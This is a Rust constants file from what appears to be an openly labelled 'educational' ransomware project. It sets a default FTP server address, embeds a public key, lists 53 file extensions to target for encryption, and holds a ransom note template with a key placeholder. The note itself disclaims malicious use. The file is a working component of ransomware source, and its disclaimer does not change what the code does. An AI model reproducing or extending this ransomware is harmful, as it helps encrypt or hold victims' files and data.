use std::sync::LazyLock;

pub static SERVER_FTP: LazyLock<&str> =
    LazyLock::new(|| option_env!("SERVER_FTP").unwrap_or("127.0.0.1:2121"));

pub const PUBLIC_KEY_PEM: &str = include_str!("../../keys/public_key.pem");

pub static VALID_EXTENSIONS: [&str; 53] = [
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".txt", ".jpg", ".jpeg", ".png",
    ".gif", ".bmp", ".tiff", ".psd", ".ai", ".mp3", ".wav", ".wma", ".aac", ".flac", ".ogg",
    ".midi", ".mp4", ".avi", ".mov", ".wmv", ".flv", ".mkv", ".webm", ".mpg", ".m4v", ".zip",
    ".rar", ".7z", ".gz", ".tar", ".iso", ".dmg", ".apk", ".exe", ".msi", ".bin", ".bat", ".sh",
    ".js", ".html", ".css", ".php", ".sql", ".ico", ".svg", ".webp",
];

pub static RANSOM_NOTE: &str =
    "######################################################################
##                                                                  ##
##                        RANSOMWARE M3STR3                         ##
##                                                                  ##
######################################################################

// ======================= ! WARNING ! ======================

This ransomware has been developed strictly for educational purposes and I,
Ignacio Jose Mestre Villagrasa, disclaim any responsibility for uses beyond
learning and experimentation. Seriously, don't get any funny ideas!

// ======================= ! WARNING ! ======================

Author: Ignacio Jose Mestre Villagrasa
GitHub: https://github.com/M3str3
Repository: https://github.com/M3str3/Ransomware

// ======================= FEATURES ======================

Welcome to Ransomware M3STR3, a simple piece of educational
software.

Before you get too excited, remember:
- This is NOT intended for evil mastermind plans. If you're looking to start
  your career in villainy, you're in the wrong place.
- This ransomware encrypts files using AES, which is both secure and quite
  effective for learning purposes.
- No actual ransom is involved. Your files are safe, and no bitcoins will
  be harmed in the process of this educational endeavor.


Lastly, if this ransomware encrypts your homework, don't blame me. Blame your curiosity. 

Stay curious, stay ethical, and happy coding!

Ignacio,

KEY = %KEY%
";
